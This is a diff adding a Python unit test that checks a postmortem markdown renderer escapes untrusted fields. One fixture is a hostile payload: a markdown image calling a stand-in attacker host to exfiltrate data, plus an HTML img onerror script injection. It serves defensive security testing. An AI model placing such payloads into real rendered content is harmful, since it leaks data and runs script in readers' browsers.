@@ -148,3 +148,23 @@ def test_counts_without_kept_text_say_it_was_written_before_29c() -> None:
     md = render_markdown(doc(sentences_dropped=2, numbers_rejected=0, removed_kept=False))
     assert "(the text was not kept: written before Phase 29c)." in md
     assert "## Removed by code" not in md
+
+
+def test_every_untrusted_field_is_escaped_in_the_markdown() -> None:
+    """Phase 30 (security review #1): T-EXF-2 said "escaped on render", but the title (an alert's
+    summary annotation can carry a label an outsider set), the root-cause statement (a critic's
+    alternative is model text), the ruled-out list and the timeline summaries (typed reasons,
+    HypothesisCreated statements) were written raw: an image or HTML fired in any renderer."""
+    evil = '![x](https://attacker.example/?d=1)<img src=x onerror="alert(1)">'
+    at = datetime(2026, 10, 2, 9, 42, tzinfo=UTC)
+    md = render_markdown(doc(
+        title=evil,
+        root_cause=RootCause(statement=evil, confidence="MEDIUM", status="VALIDATED"),
+        ruled_out=[evil],
+        timeline=[PmTimelineRow(at=at, source="HUMAN", summary=evil, actor="user:<b>x</b>")],
+    ))  # fmt: skip
+    # nothing a renderer would act on: every [ ] < > is escaped
+    assert not re.search(r"(?<!\\)[\[<]", md.split("## Most likely")[0].split("\n", 1)[0])
+    assert not re.search(r"(?<!\\)<(img|b)\b", md) and not re.search(r"(?<!\\)!\[x", md)
+    assert md.count(r"!\[x\](https://attacker.example/?d=1)\<img") == 4  # all four, as text
+    assert "user:\\<b\\>x\\</b\\>" in md
